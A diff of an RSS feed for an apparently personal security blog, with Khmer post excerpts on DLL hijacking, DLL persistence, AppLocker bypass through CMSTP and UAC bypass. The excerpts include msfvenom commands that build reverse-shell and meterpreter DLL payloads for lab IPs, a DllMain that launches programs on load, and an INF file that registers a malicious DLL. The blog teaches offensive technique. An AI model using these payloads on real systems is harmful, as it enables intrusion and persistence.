@@ -6,13 +6,13 @@
   xmlns:sy="http://purl.org/rss/1.0/modules/syndication/" 
   xmlns:media="http://search.yahoo.com/mrss/">
   <channel>
-    <title>dll on ThikLab - CyberSec</title>
+    <title>Dll on ThikLab</title>
     <link>https://th1k.github.io/en/tags/dll/</link>
-    <description>Recent content in dll on ThikLab - CyberSec</description>
+    <description>Recent content in Dll on ThikLab</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>en</language>
-    <managingEditor>leangputthik@protonmail.com (Thik)</managingEditor>
-    <webMaster>leangputthik@protonmail.com (Thik)</webMaster>
+    <managingEditor>putthik.leang@outlook.com (Thik)</managingEditor>
+    <webMaster>putthik.leang@outlook.com (Thik)</webMaster>
     <copyright><a rel='license' target='_blank' href='http://creativecommons.org/licenses/by-sa/4.0/'><img alt='Creative Commons License' style='border-width:0;display:block;margin-left:auto;margin-right:auto;' src='https://i.creativecommons.org/l/by-sa/4.0/88x31.png' /></a>©2020 - 2025 All content is licensed under <a rel='license' target='_blank' href='http://creativecommons.org/licenses/by-sa/4.0/'>CC BY-SA</a>.</copyright>
     <lastBuildDate>Fri, 07 Jul 2023 21:01:06 +0700</lastBuildDate>
     
@@ -24,7 +24,7 @@
         <title>DLL Hijacking Attack 0x01</title>
         <link>https://th1k.github.io/en/posts/dll-hijacking-0x01/</link>
         <pubDate>Fri, 07 Jul 2023 21:01:06 +0700</pubDate>
-        <author>leangputthik@protonmail.com (Thik)</author>
+        <author>putthik.leang@outlook.com (Thik)</author>
         <atom:modified>Fri, 07 Jul 2023 21:01:06 +0700</atom:modified>
         <guid>https://th1k.github.io/en/posts/dll-hijacking-0x01/</guid>
         <description>DLL hijacking ឬដែលគេត្រូវបានស្គាល់ថាជា DLL preloading ឬ DLL side-loading គឺជាវិធីសាស្ត្រវាយប្រហារដោយធ្វើការបោកបញ្ឆោតរាល់កម្មវិធី (Software) ដែលមាននៅក្នុងប្រព័ន្ធប្រតិបត្តិការវីនដូទាំងអស់ក្នុងការព្យាយាមបើកដំណើរការ DLL ដែលមានបង្កប់នូវមេរោគជាជាងបើកដំណើរការ DLL មែនទែននៃកម្មវិធី ។
@@ -32,10 +32,10 @@ Finding Missing DLLs ដើម្បីស្វែងរករាល់ DLL ដ
 ក្រោយពីយើងធ្វើការដាក់បញ្ជូល Filter ទាំងពីររួចរាល់ សូមចុច Apply នោះកម្មវិធីនឹងធ្វើការច្រោះចេញនូវរាល់ DLLs ទាំងឡាយណាដែលត្រូវការបើកដំណើរការ ប៉ុន្តែវាមិនត្រូវបានរកឃើញនៅក្នុងប្រព័ន្ធ ។
 ប្រសិនបើយើងចង់ធ្វើការ Filter ទៅលើកម្មវិធីណាមួយជាក់លាក់នោះយើងត្រូវបន្ថែមការកំណត់ Filter ដូចខាងក្រោម៖
 Exploation Path ដំបូងយើងត្រូវការ DLL Payload ដោយយើងអាចបង្កើតវាបានតាមរយៈ Framework ជាច្រើនដូចជា Metasploit / Cobalt Strike​ / DCRat ។ល។ យើងនឹងបង្កើតវាដោយប្រើប្រាស់ MSFvenom ដែលជា Standalone Payload Generator ដូចខាងក្រោម៖
-1  msfvenom -p windows/x64/shell_reverse_tcp lhost=192.168.60.136 lport=4433 -f dll &amp;gt; payload.</description>
+1 msfvenom -p windows/x64/shell_reverse_tcp lhost=192.168.60.136 lport=4433 -f dll &amp;gt; payload.</description>
         
         <dc:creator>thik</dc:creator>
-        <media:content url="https://th1k.github.ioimages/feature3/dll.png" medium="image"><media:title type="html">featured image</media:title></media:content>
+        <media:content url="https://th1k.github.io/images/feature3/dll.png" medium="image"><media:title type="html">featured image</media:title></media:content>
         
         
         
@@ -69,14 +69,14 @@ Exploation Path ដំបូងយើងត្រូវការ DLL Payload ដ
         <title>DLL Hijacking - Persistence Method</title>
         <link>https://th1k.github.io/en/posts/dll-hijacking-persistence-method/</link>
         <pubDate>Tue, 06 Dec 2022 21:01:06 +0700</pubDate>
-        <author>leangputthik@protonmail.com (Thik)</author>
+        <author>putthik.leang@outlook.com (Thik)</author>
         <atom:modified>Tue, 06 Dec 2022 21:01:06 +0700</atom:modified>
         <guid>https://th1k.github.io/en/posts/dll-hijacking-persistence-method/</guid>
         <description>CPP - Execute Command Prompt ចម្លងកូដ និង កែប្រែទីតាំងរបស់ Payload​ ។
-1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22  #include &amp;lt;windows.h&amp;gt;#include &amp;lt;unistd.h&amp;gt;using namespace std; void exec1() { WinExec(&amp;#34;cmd.exe /c C:\\programdata\\putty.exe&amp;#34;, 0); } void exec2() { WinExec(&amp;#34;cmd.exe /c calc.exe&amp;#34;, 0); } BOOL WINAPI DllMain (HANDLE hDLL, DWORD dwReason, LPVOID lpReserved) { switch (dwReason) { case DLL_PROCESS_ATTACH: exec1(); usleep(5000000); //5sec 	exec2(); break; } return TRUE; }</description>
+1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 #include &amp;lt;windows.h&amp;gt; #include &amp;lt;unistd.h&amp;gt; using namespace std; void exec1() { WinExec(&amp;#34;cmd.exe /c C:\\programdata\\putty.exe&amp;#34;, 0); } void exec2() { WinExec(&amp;#34;cmd.exe /c calc.exe&amp;#34;, 0); } BOOL WINAPI DllMain (HANDLE hDLL, DWORD dwReason, LPVOID lpReserved) { switch (dwReason) { case DLL_PROCESS_ATTACH: exec1(); usleep(5000000); //5sec exec2(); break; } return TRUE; } យោងតាម៖ dllmain</description>
         
         <dc:creator>thik</dc:creator>
-        <media:content url="https://th1k.github.ioimages/feature2/article-1.png" medium="image"><media:title type="html">featured image</media:title></media:content>
+        <media:content url="https://th1k.github.io/images/feature2/article-1.png" medium="image"><media:title type="html">featured image</media:title></media:content>
         
         
         
@@ -114,17 +114,18 @@ Exploation Path ដំបូងយើងត្រូវការ DLL Payload ដ
         <title>AppLocker Bypass - CMSTP</title>
         <link>https://th1k.github.io/en/posts/applocker-cmstp-bypass/</link>
         <pubDate>Sat, 03 Dec 2022 02:00:06 +0700</pubDate>
-        <author>leangputthik@protonmail.com (Thik)</author>
+        <author>putthik.leang@outlook.com (Thik)</author>
         <atom:modified>Sat, 03 Dec 2022 02:00:06 +0700</atom:modified>
         <guid>https://th1k.github.io/en/posts/applocker-cmstp-bypass/</guid>
         <description>ឯកសារ CMSTP ត្រូវបានរក្សាទុកនៅក្នុងថតឯកសារនៃវីនដូ៖
-1 2  C:\Windows\System32\cmstp.exe C:\Windows\SysWOW64\cmstp.exe   វីធីសាស្ត្រមួយនេះត្រូវបានរកឃើញដោយលោក Oddvar Moe អាចអានលំអិតនៅក្នុង Blog របស់គាត់។
+1 2 C:\Windows\System32\cmstp.exe C:\Windows\SysWOW64\cmstp.exe វីធីសាស្ត្រមួយនេះត្រូវបានរកឃើញដោយលោក Oddvar Moe អាចអានលំអិតនៅក្នុង Blog របស់គាត់។
 DLL Metasploit ត្រូវបានប្រើប្រាស់ដើម្បីបង្កើតឯកសារមេរោគ DLL តាមរយៈ MSFvenom ។
-1  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.200.55 LPORT=4444 -f dll &amp;gt; idm.dll   សម្រាប់ផ្នែក RegisterOCXSection តម្រូវឲ្យដាក់ទីតាំងរបស់ឯកសារ DLL ដែល​បាន​បង្កើត​រួច។
-1 2 3 4 5 6 7 8 9 10 11 12 13 14  [version] Signature=$chicago$ AdvancedINF=2.5 [DefaultInstall_SingleUser] RegisterOCXs=RegisterOCXSection [RegisterOCXSection] C:\Users\Victim\idm.dll [Strings] AppAct = &amp;#34;SOFTWARE\Microsoft\Connection Manager&amp;#34; ServiceName=&amp;#34;idm&amp;#34; ShortSvcName=&amp;#34;idm&amp;#34;   រក្សាទុកជា &amp;ldquo;idm-service.</description>
+1 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.200.55 LPORT=4444 -f dll &amp;gt; idm.dll សម្រាប់ផ្នែក RegisterOCXSection តម្រូវឲ្យដាក់ទីតាំងរបស់ឯកសារ DLL ដែល​បាន​បង្កើត​រួច។
+1 2 3 4 5 6 7 8 9 10 11 12 13 14 [version] Signature=$chicago$ AdvancedINF=2.5 [DefaultInstall_SingleUser] RegisterOCXs=RegisterOCXSection [RegisterOCXSection] C:\Users\Victim\idm.dll [Strings] AppAct = &amp;#34;SOFTWARE\Microsoft\Connection Manager&amp;#34; ServiceName=&amp;#34;idm&amp;#34; ShortSvcName=&amp;#34;idm&amp;#34; រក្សាទុកជា &amp;ldquo;idm-service.inf&amp;rdquo;
+បើកដំណើរការ Multi/handler នៅលើម៉ាស៊ីនមេ និង កំណត់ទទួលការតភ្ជាប់។</description>
         
         <dc:creator>thik</dc:creator>
-        <media:content url="https://th1k.github.ioimages/feature3/code-file.png" medium="image"><media:title type="html">featured image</media:title></media:content>
+        <media:content url="https://th1k.github.io/images/feature3/code-file.png" medium="image"><media:title type="html">featured image</media:title></media:content>
         
         
         
@@ -166,14 +167,14 @@ DLL Metasploit ត្រូវបានប្រើប្រាស់ដើម�
         <title>Bypass UAC DLL Method</title>
         <link>https://th1k.github.io/en/posts/bypass-uac-dll-method/</link>
         <pubDate>Sat, 03 Dec 2022 02:00:06 +0700</pubDate>
-        <author>leangputthik@protonmail.com (Thik)</author>
+        <author>putthik.leang@outlook.com (Thik)</author>
         <atom:modified>Sat, 03 Dec 2022 02:00:06 +0700</atom:modified>
         <guid>https://th1k.github.io/en/posts/bypass-uac-dll-method/</guid>
         <description>ដើម្បីធ្វើការ Bypass ទៅលើ UAC នៅរាល់ប្រព័ន្ធប្រតិបត្តិការវីនដូជំនាន់ថ្មី (៨/១០/១១) យើងអាចប្រើប្រាស់ឯកសារ PS1 ដើម្បីបង្កើតចេញជា dll reflection ដែលអាច Exploit តាមរយៈឯកសារដើម cmstp.exe នៃប្រព័ន្ធគោលពីរ។
-C# DLL Reflection Code 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100  /* UAC Bypass using CMSTP.</description>
+C# DLL Reflection Code 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 /* UAC Bypass using CMSTP.</description>
         
         <dc:creator>thik</dc:creator>
-        <media:content url="https://th1k.github.ioimages/feature2/article-1.png" medium="image"><media:title type="html">featured image</media:title></media:content>
+        <media:content url="https://th1k.github.io/images/feature2/article-1.png" medium="image"><media:title type="html">featured image</media:title></media:content>
         
         
         
